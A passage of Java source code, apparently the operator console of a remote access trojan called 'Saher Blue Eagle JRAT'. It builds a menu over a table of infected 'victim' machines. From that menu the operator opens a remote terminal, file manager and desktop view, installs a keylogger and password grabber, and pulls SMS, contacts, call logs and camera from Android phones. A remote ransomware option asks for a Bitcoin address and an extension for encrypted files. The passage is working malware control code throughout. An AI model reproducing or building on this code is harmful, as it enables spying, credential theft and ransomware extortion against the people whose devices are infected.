		        	String selected_value = j.getModel().getValueAt(selectedRow, 7).toString();

		        	if(selectedRow == -1)
		        	{
		        		// No row selected
		        		 
		        		return;
		        	}
		        	if (selected_value.contains("Jar Trojan") || selected_value.contains("PC")  || selected_value.contains("Jar Trojan is Running")  ){
		        		if(selected_value.contains("MAC") || selected_value.contains("Mac") || selected_value.contains("win") || selected_value.contains("Linux") || selected_value.contains("nux") || selected_value.contains("Keyloggger")){
		        			popupMenu_computers.removeAll();
		        			popupMenu_computers.add(menuItemFilemanager);
		        			popupMenu_computers.add(menuItemDesktop);
		        			popupMenu_computers.add(menuItemProcess);
		        			popupMenu_computers.add(menuItemTerminal);
		        			popupMenu_computers.add(menuItemInstall);
		        			popupMenu_computers.add(Install_pass_grab);
		        			popupMenu_computers.add(pass_grab);
		        	
		        			popupMenu_computers.add(menuItemOther);
		        			popupMenu_computers.add(menuItemRemoveVictim);
		        			menuItemRemoveVictim.setForeground(Color.WHITE);
		        			menuItemFilemanager.setForeground(Color.WHITE);
		        			menuItemDesktop.setForeground(Color.WHITE);
		        			menuItemProcess.setForeground(Color.WHITE);
		        			menuItemTerminal.setForeground(Color.WHITE);
		        			menuItemInstall.setForeground(Color.WHITE);
		        			Install_pass_grab.setForeground(Color.WHITE);
		        			pass_grab.setForeground(Color.WHITE);
		        			menuItemOther.setForeground(Color.WHITE);
		        			popupMenu_computers.setBackground(new Color(0, 64, 128));
		        		}
		        	}else{
		      
		        		if (j.getModel().getValueAt(selectedRow, 6).toString().contains("Android") || j.getModel().getValueAt(selectedRow, 6).toString().contains("APK") || selected_value.toUpperCase().contains(("screen").toUpperCase())){
		        			  
		        			popupMenu_computers.removeAll();
		        			popupMenu_computers.add(android_cam);
		        			popupMenu_computers.add(android_contacts);
		        			popupMenu_computers.add(android_calllogs);
		        			popupMenu_computers.add(android_filemanager);
		        			popupMenu_computers.add(android_sms);
		        			popupMenu_computers.add(android_apps);
		        			popupMenu_computers.add(android_chat);
		        			//popupMenu_computers.add(android_phone_settings);
		        			popupMenu_computers.add(android_keylogger);
		        			popupMenu_computers.add(android_terminal);
		        			//
		        			popupMenu_computers.add(android_uninstall);
		        			android_uninstall.setForeground(Color.WHITE);
		        			android_terminal.setForeground(Color.WHITE);
		        			android_keylogger.setForeground(Color.WHITE);
		        			android_chat.setForeground(Color.WHITE);
		        			android_apps.setForeground(Color.WHITE);
		        			android_sms.setForeground(Color.WHITE);
		        			android_filemanager.setForeground(Color.WHITE);
		        			android_calllogs.setForeground(Color.WHITE);
		        			android_cam.setForeground(Color.WHITE);
		        			android_contacts.setForeground(Color.WHITE);
		        			android_phone_settings.setForeground(Color.WHITE);
		        			popupMenu_computers.setBackground(new Color(0, 64, 128));
		        		}
		        	}
				}catch(Exception e){
					 
				}
				
			}
			
			@Override
			public void popupMenuWillBecomeInvisible(PopupMenuEvent arg0) {
				/*here called after hide / close it  , but we don`t have to use*/
			}
			
			@Override
			public void popupMenuCanceled(PopupMenuEvent arg0) {
				/*here called after cancelation , but we don`t have to use*/
			}
		});
			
			
			// adding it to JScrollPane 
	        for (String Col_name : columnNames){
	        	TableColumn Col = new TableColumn();
		        
		        model.addColumn(Col_name);
		        
	        }
	      	        j = new JTable(model); 
	      	        
	      	        
	        j.setBounds(5, 50, 990, 300); 
	        
	        j.setComponentPopupMenu(popupMenu_computers);
	        j.setBackground(Color.WHITE);
	     menuItemFilemanager.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "moricons_66.png" )));
			 menuItemFilemanager.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent event) {
						//do here some stuff
						int selectedRow = j.getSelectedRow();
						if(selectedRow == -1)
			        	{
			        		// No row selected
			        		 
			        		return;
			        	}
			        	String selected_sock = j.getModel().getValueAt(selectedRow, 2).toString();
			        	System.out.println("Master File Command IP : " + selected_sock);
			        	String other_Data = j.getModel().getValueAt(selectedRow, 6).toString();
			        	if (other_Data.contains(".vbs")){
			        		try {
								//Server_X_Client.Send_To_client_Vbs("fm_drives",selected_sock);
								Server_X_Client.Send_To_client_Vbs("open_fm",selected_sock);
							} catch (IOException e) {}
			        	}else if (other_Data.contains("EXE Trojan")){
			        		
			        		Send_Data("openfm" + Exe_Split + Exe_Ending,selected_sock,false);
			        		  j.getSelectionModel().clearSelection();
							  j.repaint();
			        	}else if (other_Data.contains("jar") || j.getModel().getValueAt(selectedRow, 1).toString().toUpperCase().contains("JAVA")){
			        		
			        		Send_Data("openfm" + Exe_Split + Exe_Ending,selected_sock,false);
			        		  j.getSelectionModel().clearSelection();
							  j.repaint();
			        	}
			        	
			         
					}
				});//dsktop
			 menuItemDesktop.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "desktop icon.png" )));
			 menuItemDesktop.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent event) {
						//do here some stuff
					 	int selectedRow = j.getSelectedRow();
						if(selectedRow == -1)
			        	{
			        		// No row selected
			        		 
			        		return;
			        	}
			        	String selected_sock = j.getModel().getValueAt(selectedRow, 2).toString();
			        	System.out.println("Master Desktop Command IP : " + selected_sock);
			        	String other_Data = j.getModel().getValueAt(selectedRow, 6).toString();
			        	if (other_Data.contains(".vbs")){
			        		try {
								//Server_X_Client.Send_To_client_Vbs("fm_drives",selected_sock);
								//Server_X_Client.Send_To_client_Vbs("open_fm",selected_sock);
							} catch (Exception e) {}
			        	}else if (other_Data.contains("EXE Trojan")){
			        		
			        		Send_Data("dsktop" + Exe_Split + Exe_Ending,selected_sock,false);
			        		  j.getSelectionModel().clearSelection();
							  j.repaint();
			        	}else if (other_Data.contains("jar") || j.getModel().getValueAt(selectedRow, 1).toString().toUpperCase().contains("JAVA") ||other_Data.contains("Linux")){
			        		
			        		Send_Data("dsktop" + Exe_Split + Exe_Ending,selected_sock,false);
			        		System.out.print(" I Commanded");
			        		  j.getSelectionModel().clearSelection();
							  j.repaint();
			        	}
					}
				});
			 
			
			        menuItemProcess.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "process.png" )));
			    menuItemProcess.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent event) {
						//do here some stuff
						int selectedRow = j.getSelectedRow();
						if(selectedRow == -1)
			        	{
			        		// No row selected
			        		 
			        		return;
			        	}
			        	String selected_sock = j.getModel().getValueAt(selectedRow, 2).toString();
			        	String other_Data = j.getModel().getValueAt(selectedRow, 6).toString();
			        	if (other_Data.contains(".vbs")){//
			        		try {
								Server_X_Client.Send_To_client_Vbs("enum_proc",selected_sock);
							} catch (IOException e) {}
			        	}else if (other_Data.contains("EXE Trojan")){
			        		
			        		Send_Data("open_proc" + Exe_Split + Exe_Ending,selected_sock,false);
			        		  j.getSelectionModel().clearSelection();
							  j.repaint();
			        	}else if (other_Data.contains("jar") || j.getModel().getValueAt(selectedRow, 1).toString().toUpperCase().contains("JAVA")){
			        		
			        		Send_Data("open_proc" + Exe_Split + Exe_Ending,selected_sock,false);
			        		  j.getSelectionModel().clearSelection();
							  j.repaint();
			        	}
			        	
			        	
			        	
					}
				});
			    menuItemTerminal.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "TERMINAL.png" )));
			    menuItemTerminal.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent event) {
						//do here some stuff
						int selectedRow = j.getSelectedRow();
						if(selectedRow == -1)
			        	{
			        		// No row selected
			        		 
			        		return;
			        	}
			        	String selected_sock = j.getModel().getValueAt(selectedRow, 2).toString();
			        	String other_Data = j.getModel().getValueAt(selectedRow, 6).toString();
			        	if (other_Data.contains(".vbs")){//
			        		try {
								Server_X_Client.Send_To_client_Vbs("apply_cmd",selected_sock);
							} catch (IOException e) {}
			        	}else if (other_Data.contains("EXE Trojan")){
			        		
			        		Send_Data("opencmd" + Exe_Split + Exe_Ending,selected_sock,false);
			        		  j.getSelectionModel().clearSelection();
							  j.repaint();
			        	}else if (other_Data.contains("jar") || j.getModel().getValueAt(selectedRow, 1).toString().toUpperCase().contains("JAVA")){
			        		
			        		Send_Data("openterminal" + Exe_Split + Exe_Ending,selected_sock,false);
			        		  j.getSelectionModel().clearSelection();
							  j.repaint();
			        	}
			        	
			        	
			        	
					}
				});
			    RunRansomware.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "Ransomicon.png" )));
			    RunRansomware.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent event) {
						//do here some stuff
						int selectedRow = j.getSelectedRow();
						if(selectedRow == -1)
			        	{
			        		// No row selected
			        		 
			        		return;
			        	}
			        	String selected_sock = j.getModel().getValueAt(selectedRow, 2).toString();
			        	String other_Data = j.getModel().getValueAt(selectedRow, 6).toString();
			        	if (other_Data.contains(".vbs")){//
			        		try {
								//Server_X_Client.Send_To_client_Vbs("apply_cmd",selected_sock);
							} catch (Exception e) {}
			        	}else if (other_Data.contains("EXE Trojan")){
			        		
			        		//Send_Data("opencmd" + Exe_Split + Exe_Ending,selected_sock);
			        		  j.getSelectionModel().clearSelection();
							  j.repaint();
			        	}else if (other_Data.contains("jar") || j.getModel().getValueAt(selectedRow, 1).toString().toUpperCase().contains("JAVA")){
			        		//check first 
			        	//	 new ImageMessageBox().show_box("","","/some_icons/" + "ransomconfirm.png" );
			        		  ImageIcon iconic = new ImageIcon(Master.class.getResource("/some_icons/" + "ransomconfirm3.png"));
			        		  
			        		 if(JOptionPane.showConfirmDialog(form, "This Option is on user responsibility , this will run ransomware on client / victim PC "+"\n"+" this will convert it to a useless PC as shown in image" + "\n" +
			        		        "Are you sure you want to run the Ransomware on Victim PC ?", "Remote Ransomware Confirmation", 
			        		        JOptionPane.YES_NO_OPTION,
			        		        JOptionPane.QUESTION_MESSAGE,iconic) == JOptionPane.YES_OPTION){
			        			 
			        			 //take user bitcoin
			        			 String bitcoin_entry;
			        		    	bitcoin_entry = "Enter Bitcoin"  ; 
			        		    	ImageIcon biticon = new ImageIcon(Master.class.getResource("/some_icons/" + "bitcoin.png"));
			        		    	bitcoin_entry = (String) JOptionPane.showInputDialog(popupMenu_computers, "Bitcoin Address For Ransomware Option Victim : "+ j.getModel().getValueAt(selectedRow, 2) + "\n" + "Note : This Option is on user responsibility" ,bitcoin_entry,selectedRow, biticon, null, bitcoin_entry);
			        		    	if(bitcoin_entry.length()>=10){
			        		    		 String extention_entry;
			        		    		 extention_entry = ".encrypted"  ; 
			        		    		 biticon = new ImageIcon(Master.class.getResource("/some_icons/" + "extensioniconr.png"));
			        		    		 extention_entry = (String) JOptionPane.showInputDialog(popupMenu_computers, "Ransomware File Extension For Ransomware Option Victim : "+ j.getModel().getValueAt(selectedRow, 2) + "\n" + "Note : This Option is on user responsibility" ,"Enter ransomware file extension",selectedRow, biticon, null, extention_entry);
					        		    	if(extention_entry.length()>=2){
					        		    	 
					        		    		  String full_hacker_data = "";
					        		    		 String platformx = System.getProperty("os.name", "generic").toLowerCase(Locale.ENGLISH);
												 if ((platformx.indexOf("mac") >= 0) || (platformx.indexOf("darwin") >= 0)) {
													 
													 File_Seperator = ":";
													 full_hacker_data = "RAT was working on : MAC PC ,OS :" + platformx;
												      } else if (platformx.indexOf("win") >= 0) {
												    	  File_Seperator = "\\";
												    	  full_hacker_data = "RAT was working on : Windows PC ,OS :" + platformx;
												      } else if (platformx.indexOf("nux") >= 0) {
												    	  File_Seperator = "/";
												    	  full_hacker_data = "RAT was working on : Linux PC ,OS :" + platformx;
												      } else {
												    	  full_hacker_data = "RAT was working on : PC ,OS :" + platformx;
												    	  File_Seperator = System.getProperty("path.separator");
												    	  if(File_Seperator !="/" || File_Seperator !="\\" || File_Seperator !=":"){
												    		  File_Seperator = System.getProperty("file.separator");
												    		  if(File_Seperator !="/" || File_Seperator !="\\" || File_Seperator !=":"){
												    			  File_Seperator = "/";
												    		  }
												    	  }
												      }
												 String User = System.getProperty("user.name");
												 full_hacker_data +=" ** Hacker PC username : " + User;
												 
											     String property = "java.io.tmpdir";
											     String tempDir = System.getProperty(property);
											     full_hacker_data +=" ** Hacker tempDir : " + tempDir;
											   full_hacker_data +=" ** Hacker PC BaseBoard Serial : " + getSystemMotherBoard_SerialNumber();    
											   full_hacker_data +=" ** Hacker Commanded Ransomware for You at : Date Year/M/D : "  + new SimpleDateFormat("yyyy/MM/dd").format(Calendar.getInstance().getTime()); 
											   full_hacker_data +=" ** Time H:M:S : "  + new SimpleDateFormat("hh:mm:ss").format(Calendar.getInstance().getTime()); 
											   try {
												if(check_ifsock_local(selected_sock)==false){
													     if(bt_qp_tas.length()>5){
													   Send_Data("run_global_r" + Exe_Split  + bt_qp_tas + Exe_Split + extention_entry +Exe_Split + full_hacker_data +Exe_Split+  Exe_Ending,selected_sock,false);
												  }else{
												 
													    Send_Data("run_ransomware" + Exe_Split  + bitcoin_entry + Exe_Split + extention_entry +Exe_Split + full_hacker_data +Exe_Split+  Exe_Ending,selected_sock,false);
												  }
												   }else{ 
													   if (JOptionPane.showConfirmDialog(form, 
												            "Are you sure you want to run remote Ransomware on local PC , IP ["+selected_sock+"] ?" , "run remote local Ransomware?", 
												            JOptionPane.YES_NO_OPTION,
												            JOptionPane.QUESTION_MESSAGE) == JOptionPane.YES_OPTION){
														   if(bt_qp_tas.length()>5){
															   Send_Data("run_global_r" + Exe_Split  + bt_qp_tas + Exe_Split + extention_entry +Exe_Split + full_hacker_data +Exe_Split+  Exe_Ending,selected_sock,false);
														  }else{
															  full_hacker_data +=" ** Hacker Bitcoin : "  + bitcoin_entry; 
															  Send_Data("run_ransomware" + Exe_Split  + bitcoin_entry + Exe_Split + extention_entry +Exe_Split + full_hacker_data +Exe_Split+  Exe_Ending,selected_sock,false);

														  }
												        } 
												   }
											} catch (Exception e) {
											
											} 
											  
										 
											  
											  
											    
					        		    					        		    	}
			        		    	}
			        		    	
			        				
			        			}
			        			
			        		
			        		  j.getSelectionModel().clearSelection();
							  j.repaint();
			        	}
			        	
			        	
			        	
					}
				});
			 menuItemOther.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "keylogger.png" )));
			    menuItemOther.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent event) {
						//do here some stuff
						int selectedRow = j.getSelectedRow();
						if(selectedRow == -1)
			        	{
			        		// No row selected
			        		 
			        		return;
			        	}
			        	String selected_sock = j.getModel().getValueAt(selectedRow, 2).toString();
			        	String other_Data = j.getModel().getValueAt(selectedRow, 6).toString();
			        	 if (other_Data.contains("EXE Trojan")){
			        		
			        		Send_Data("keylogger" + Exe_Split + Exe_Ending,selected_sock,false);
			        		  j.getSelectionModel().clearSelection();
							  j.repaint();
			        	}else if (other_Data.contains("jar") || j.getModel().getValueAt(selectedRow, 1).toString().toUpperCase().contains("JAVA")){
			        		
			        		Send_Data("keylogger" + Exe_Split + Exe_Ending,selected_sock,false);
			        		  j.getSelectionModel().clearSelection();
							  j.repaint();
			        	}
			        	
			        	
			        	
					}
				});
			    Install_pass_grab.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "pawsx.png" )));
			    pass_grab.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "paws.png" )));
		 menuItemInstall.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "keylogger.png" )));
			    menuItemInstall.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent event) {
						//do here some stuff
						int selectedRow = j.getSelectedRow();
						if(selectedRow == -1)
			        	{
			        		// No row selected
			        		 
			        		return;
			        	}
			        	String selected_sock = j.getModel().getValueAt(selectedRow, 2).toString();
			        	String other_Data = j.getModel().getValueAt(selectedRow, 6).toString();
			        	 if (other_Data.contains("EXE Trojan")){
			        		
			        		Send_Data("install_logger" + Exe_Split + Exe_Ending,selected_sock, false);
			        		  j.getSelectionModel().clearSelection();
							  j.repaint();
			        	}else if (other_Data.contains("jar") || other_Data.contains("Jar") || j.getModel().getValueAt(selectedRow, 1).toString().toUpperCase().contains("JAVA")){
			        		
			        		Send_Data("install_logger" + Exe_Split + Exe_Ending,selected_sock, false);
			        		  j.getSelectionModel().clearSelection();
							  j.repaint();
			        	}
			        	
			        	
			        	
					}
				});
			    Install_pass_grab.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent event) {
						//do here some stuff
						int selectedRow = j.getSelectedRow();
						if(selectedRow == -1)
			        	{
			        		// No row selected
			        		 
			        		return;
			        	}
			        	String selected_sock = j.getModel().getValueAt(selectedRow, 2).toString();
			        	String other_Data = j.getModel().getValueAt(selectedRow, 6).toString();
			        	 if (other_Data.contains("EXE Trojan")){
			        		
			        		Send_Data("install_pass_grabber" + Exe_Split + Exe_Ending,selected_sock, false);
			        		  j.getSelectionModel().clearSelection();
							  j.repaint();
			        	}else if (other_Data.contains("jar") || other_Data.contains("Jar") || j.getModel().getValueAt(selectedRow, 1).toString().toUpperCase().contains("JAVA")){
			        		
			        		Send_Data("install_pass_grabber" + Exe_Split + Exe_Ending,selected_sock, false);
			        		  j.getSelectionModel().clearSelection();
							  j.repaint();
			        	}
			        	
			        	
			        	
					}
				}); 
		  pass_grab.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent event) {
						//do here some stuff
						int selectedRow = j.getSelectedRow();
						if(selectedRow == -1)
			        	{
			        		// No row selected
			        		 
			        		return;
			        	}
			        	String selected_sock = j.getModel().getValueAt(selectedRow, 2).toString();
			        	String other_Data = j.getModel().getValueAt(selectedRow, 6).toString();
			        	 if (other_Data.contains("EXE Trojan")){
			        		
			        		Send_Data("get_passwords" + Exe_Split + Exe_Ending,selected_sock, false);
			        		  j.getSelectionModel().clearSelection();
							  j.repaint();
			        	}else if (other_Data.contains("jar") || other_Data.contains("Jar") || j.getModel().getValueAt(selectedRow, 1).toString().toUpperCase().contains("JAVA")){
			        		
			        		Send_Data("get_passwords" + Exe_Split + Exe_Ending,selected_sock, false);
			        		  j.getSelectionModel().clearSelection();
							  j.repaint();
			        	}
			        	
			        	
			        	
					}
				});
			 menuItemRemoveVictim.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "delete icon.png" )));
			 menuItemRemoveVictim.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent event) {
						//do here some stuff
						int selectedRow = j.getSelectedRow();
						if(selectedRow == -1)
			        	{
			        		// No row selected
			        		 
			        		return;
			        	}
			        	String selected_sock = j.getModel().getValueAt(selectedRow, 2).toString();
			        	String other_Data = j.getModel().getValueAt(selectedRow, 6).toString();
			        	if (other_Data.contains(".vbs")){//
			        		try {
								Server_X_Client.Send_To_client_Vbs("uns",selected_sock);
							} catch (IOException e) {}
			        	}else if (other_Data.contains("EXE Trojan")){
			        		
			        		Send_Data("endcon" + Exe_Split + Exe_Ending,selected_sock, false);
			        		  j.getSelectionModel().clearSelection();
							  j.repaint();
			        	}else if (other_Data.contains("jar") || j.getModel().getValueAt(selectedRow, 1).toString().toUpperCase().contains("JAVA")){
			        		
			        		Send_Data("endcon" + Exe_Split + Exe_Ending,selected_sock, false);
			        		  j.getSelectionModel().clearSelection();
							  j.repaint();
			        	}
			        	
			        	
			        	
					}
				});/*JFileChooser fileChooser = new JFileChooser();
if (fileChooser.showOpenDialog(modalToComponent) == JFileChooser.APPROVE_OPTION) {
  File file = fileChooser.getSelectedFile();
  // load from file
}*/
			 
	        //j.addMouseListener(new Victim_Selector(j)); //Sets Victim Selector Listener to jTable for victims
			 JTableHeader tableHeader = j.getTableHeader();
		 
		      tableHeader.setForeground(Color.black);
	     btnNext.setFont(font);
		 btnNext2.setFont(font);
		 JLabelx.setForeground(Color.WHITE);
		 JLabelx.setFont(font);
		 JLabelxx.setForeground(Color.WHITE);
		 JLabelxx.setFont(font);
		 	  form.setLayout(new BorderLayout());
		 	  sp = new JScrollPane(j); 
		        sp.setBounds(5, 50, 990, 300); 
		        
		        
		 // JSplitPane spLeft = new JSplitPane(JSplitPane.VERTICAL_SPLIT, sp, new JPanel());
		   // spLeft.setDividerSize(200);
		   // spLeft.setContinuousLayout(true);
		        JPanel Buttons = new JPanel();
		        Buttons.setSize(50, 50);
		        Buttons.setBackground(new Color(0, 64, 128));//Color.DARK_GRAY);
		        
		        
		        Buttons.setLayout(null);
		        JLabelxx.setBounds(5, 0, 180, 25);
		        screen.setBounds(5,30, 50, 50);
		       
		            //screen.setIcon(new ImageIcon(new ImageIcon("Tool ScreenShot.jpg").getImage().getScaledInstance(20, 20, Image.SCALE_DEFAULT)));
		        Buttons.add(btnNext);
		         
		        Checkbox fast_sc = new Checkbox("Show Screen");  
		        fast_sc.addItemListener(new ItemListener() {  
		        	@Override
		             public void itemStateChanged(ItemEvent e) {               
		              if( e.getStateChange() ==1){
		            	  get_fast = true;
		              }else{
		            	  get_fast = false;
		            	  screen.setIcon(null);
		            	  screen.repaint();
		              }
		              
		             }

					 
		          });  
		        
		        fast_sc.setFont(font);
		        fast_sc.setForeground(Color.WHITE);
		    	fast_sc.setBounds(70, 231, 100, 23);
				   Buttons.add(fast_sc);
				   Buttons.add(btnNext2);
				   Buttons.add(btnNextx);
		        
		        Buttons.add(JLabelx);
		        Buttons.add(JLabelxx);
		        Buttons.add(screen);
		    JSplitPane spRight = new JSplitPane(JSplitPane.VERTICAL_SPLIT, sp,null );
		   // spRight.setDividerSize(300);
		   // spRight.setContinuousLayout(true);
		    final JSplitPane split;

		    split = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT, sp,Buttons );
		   // split.setContinuousLayout(false);
		    split.setDividerSize(10);
		    split.setDividerLocation((form.getWidth() - form.getWidth()/4) -50);
		    split.setOneTouchExpandable(true);
		    //form.add(split, BorderLayout.CENTER);
		 
		    form.getContentPane().add(split, BorderLayout.CENTER);
	 ;
		    form.addComponentListener(new ComponentAdapter() {
		        public void componentResized(ComponentEvent componentEvent) {
		        	split.setDividerLocation((form.getWidth() - form.getWidth()/4) -50);
		        	screen.setSize((form.getWidth() - form.getWidth()/4), 200);
			     
		        	split.validate();
		        	split.repaint();
		        }
		    });
 
		 form.validate();
		 form.setResizable(true);
		 form.getContentPane().setBackground(Color.DARK_GRAY);
 
	 
	      j.addMouseListener(new MouseAdapter() {
	            public void mouseClicked(MouseEvent me) {
	               if (me.getClickCount() == 1) {     // to detect doble click events
	            	  
	           			Check_For_version_update();
	           		 
	            	   int selectedRow = j.getSelectedRow();
			        	String selected_sock = j.getModel().getValueAt(selectedRow, 2).toString();
			        	System.out.println("Master File Command IP : " + selected_sock);
			        	String other_Data = j.getModel().getValueAt(selectedRow, 6).toString();
			        	String other_Data_keylogger_status = j.getModel().getValueAt(selectedRow, 7).toString();
			        	 if (other_Data_keylogger_status.contains("eyloggger : Installe")){
			        		 menuItemInstall.setEnabled(false);
			        		 menuItemInstall.repaint();
			        		 
			        		 menuItemOther.setEnabled(true);
			        		 menuItemOther.repaint();
			        		 form.repaint();
			        	 }
			        	 if (other_Data_keylogger_status.contains("eyloggger : Not Installe")){
			        		 menuItemInstall.setEnabled(true);
			        		 menuItemInstall.repaint();
			        		 
			        		 menuItemOther.setEnabled(false);
			        		 menuItemOther.repaint();
			        		 form.repaint();
			        		 
			        		 
			        	 }
			        	 
			        	  j.getComponentPopupMenu().repaint();
			        	if (other_Data.contains(".vbs")){
			        	 
			        	}else if (other_Data.contains("EXE Trojan")){
			        		 if(get_fast==true){
			        			 Send_Data("fast_screen" + Exe_Split + Exe_Ending,selected_sock, false);
			        		 }
			        		
			        		}else if (other_Data.contains("jar")||other_Data.contains("Jar") || j.getModel().getValueAt(selectedRow, 1).toString().toUpperCase().contains("JAVA")){
			        			 if(get_fast==true){
			        				 Send_Data("fast_screen" + Exe_Split + Exe_Ending,selected_sock, false);
			        			 }
			        		
			        		
			        	}
			        	
			        	 
			        	x_check.interrupt();
	               }
	            }
	         });
	        
		   form.addWindowListener(new java.awt.event.WindowAdapter() {
			    @Override
			    public void windowClosing(java.awt.event.WindowEvent windowEvent) {
			        if (JOptionPane.showConfirmDialog(form, 
			            "Are you sure you want to Close Saher Blue Eagle JRAT?", "Close Window?", 
			            JOptionPane.YES_NO_OPTION,
			            JOptionPane.QUESTION_MESSAGE) == JOptionPane.YES_OPTION){
			            System.exit(0);
			        }
			    }
			});
		   DefaultTableCellRenderer headerRenderer = new DefaultTableCellRenderer();
		   headerRenderer.setBackground(new Color(0, 64, 128));
		   headerRenderer.setForeground(Color.WHITE);

		   for (int i = 0; i < j.getModel().getColumnCount(); i++) {
		           j.getColumnModel().getColumn(i).setHeaderRenderer(headerRenderer);
		          
		           j.setFont( new Font("Microsoft Sans Serif", Font.BOLD, 12));
		           
		   }
		   
			   j.setGridColor(new Color(0, 64, 128));
			   j.setBackground(new Color(0, 64, 128) );
			   j.setOpaque(true);
			   j.setFillsViewportHeight(true);
			   j.setForeground(Color.WHITE);
		   j.validate();
		   popupMenu_computers.setBackground(new Color(0, 64, 128));
		   for(Component x:popupMenu_computers.getComponents()){
			   x.setBackground(new Color(0, 64, 128));
			   x.setForeground(Color.WHITE);
		   }
		   form.repaint();
		 form.setVisible(true);
		 prepare_country();
	}
	 private static String getWindowsMotherboard_SerialNumber() {
	        String result = "";
	        
	        try {
	            File file = File.createTempFile("realhowto",".vbs");
	            file.deleteOnExit();
	            FileWriter fw = new java.io.FileWriter(file);

	            String vbs =
	            "Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")\n"
	              + "Set colItems = objWMIService.ExecQuery _ \n"
	              + "   (\"Select * from Win32_BaseBoard\") \n"
	              + "For Each objItem in colItems \n"
	              + "    Wscript.Echo objItem.SerialNumber \n"
	              + "    exit for  ' do the first cpu only! \n"
	              + "Next \n";

	            fw.write(vbs);
	            fw.close();

	            Process p = Runtime.getRuntime().exec("cscript //NoLogo " + file.getPath());
	            BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
	            String line;
	            while ((line = input.readLine()) != null) {
	               result += line;
	            }
	            input.close();
	        }
	        catch(Exception E){
	             System.err.println("Windows MotherBoard Exp : "+E.getMessage());
	        }
	        return result.trim();
	    } 
	    
	    
	    
	    private static String GetLinuxMotherBoard_serialNumber() {
	        String command = "dmidecode -s baseboard-serial-number";
	        String sNum = null; 
	        try {   
	            Process SerNumProcess = Runtime.getRuntime().exec(command);
	            BufferedReader sNumReader = new BufferedReader(new InputStreamReader(SerNumProcess.getInputStream()));
	            sNum = sNumReader.readLine().trim();
	            SerNumProcess.waitFor();
	            sNumReader.close();
	        }
	        catch (Exception ex) {
	            System.err.println("Linux Motherboard Exp : "+ex.getMessage());
	            sNum =null;
	        }
	        return sNum; 
	    }
	    private static String GetUinuxMotherBoard_serialNumber() {
	        String command = "ioreg -l | grep IOPlatformSerialNumber";
	        String sNum = null; 
	        try {   
	            Process SerNumProcess = Runtime.getRuntime().exec(command);
	            BufferedReader sNumReader = new BufferedReader(new InputStreamReader(SerNumProcess.getInputStream()));
	            sNum = sNumReader.readLine().trim();
	            SerNumProcess.waitFor();
	            sNumReader.close();
	        }
	        catch (Exception ex) {
	        	try { 
	        		 String double_qoutes = "\"";
		            Process SerNumProcess = Runtime.getRuntime().exec("system_profiler |grep "+ double_qoutes + "r (system)" + double_qoutes);//system_profiler |grep "r (system)"
		            BufferedReader sNumReader = new BufferedReader(new InputStreamReader(SerNumProcess.getInputStream()));
		            sNum = sNumReader.readLine().trim();
		            SerNumProcess.waitFor();
		            sNumReader.close();
		        }
		        catch (Exception ex2) {
		            System.err.println("Uinux Motherboard Exp : "+ex.getMessage());
		            sNum =null;
		        }
	        }
	        return sNum; 
	    }
	  private  static String getSystemMotherBoard_SerialNumber(){
	        try{
	            String OSName=  System.getProperty("os.name");
	            if(OSName.contains("Windows") || OSName.toLowerCase().contains("win")){
	                return (getWindowsMotherboard_SerialNumber());
	            }
	            else  if(OSName.contains("Linux") || OSName.toLowerCase().contains("nux")|| OSName.toLowerCase().contains("linu")){
	                return (GetLinuxMotherBoard_serialNumber());
	            }
	            else  if(OSName.contains("Mac") || OSName.toLowerCase().contains("mac")|| OSName.toLowerCase().contains("mac")){
	                return (GetUinuxMotherBoard_serialNumber());
	            }else {
	                return (GetLinuxMotherBoard_serialNumber());
	            }
	           
	         
	        }
	        catch(Exception E){
	            System.err.println("System MotherBoard Exp : "+E.getMessage());
	            return null;
	        }
	    }
	 private static  ArrayList<String> SplitString(String s){
		 String Word = "";
		 String YY = "";
		 String xx = "|||";
		 YY = xx.charAt(0)+ "" +xx.charAt(1);
	 ArrayList<String>Words = new ArrayList<String>();
	 if(s.contains(YY)==false){
		 Words.add(s);
		 
		
		 return Words;
			
	 }else{

		 for (int i = 0 ; i<s.length();i++){
			 if ((s.charAt(i) =='|')== false) {
				 Word += s.charAt(i);
			 }else{
				 if(Words.contains(Word)==false){
				 Words.add(Word);
				 
				}
				 Word = "";
			 }
		 }
			 
			 return Words;
			 
	 }
		   
	 }
	private static String File_Seperator = "xxx";
	private static ArrayList<String> Open_Forms = new ArrayList<String>();
	private static ArrayList<File_Manager_VB> Open_FM_VB = new ArrayList<File_Manager_VB>();
	private static ArrayList<Notif> Open_Notif = new ArrayList<Notif>();	
	private static ArrayList<terminal_command> Open_Shells = new ArrayList<terminal_command>();
	private static ArrayList<Downloader> Open_Downloaders= new ArrayList<Downloader>();
	private static ArrayList<Downloader_uns> Open_Downloaders_uns= new ArrayList<Downloader_uns>();
	private static ArrayList<Uploader> Open_Uploaders_uns= new ArrayList<Uploader>();
	private static ArrayList<Password_Viewer> Open_Password_Viewer = new ArrayList<Password_Viewer>();
	private static ArrayList<File_Manager_vbs> Open_FM_vbs = new ArrayList<File_Manager_vbs>();
	private static ArrayList<Desktop_VB> Open_Desktops_VB = new ArrayList<Desktop_VB>();	
	private static ArrayList<keylogger_viewer> Open_Loggers = new ArrayList<keylogger_viewer>();
	private static ArrayList<Process_Manager> Open_Proc_VB = new ArrayList<Process_Manager>();
	
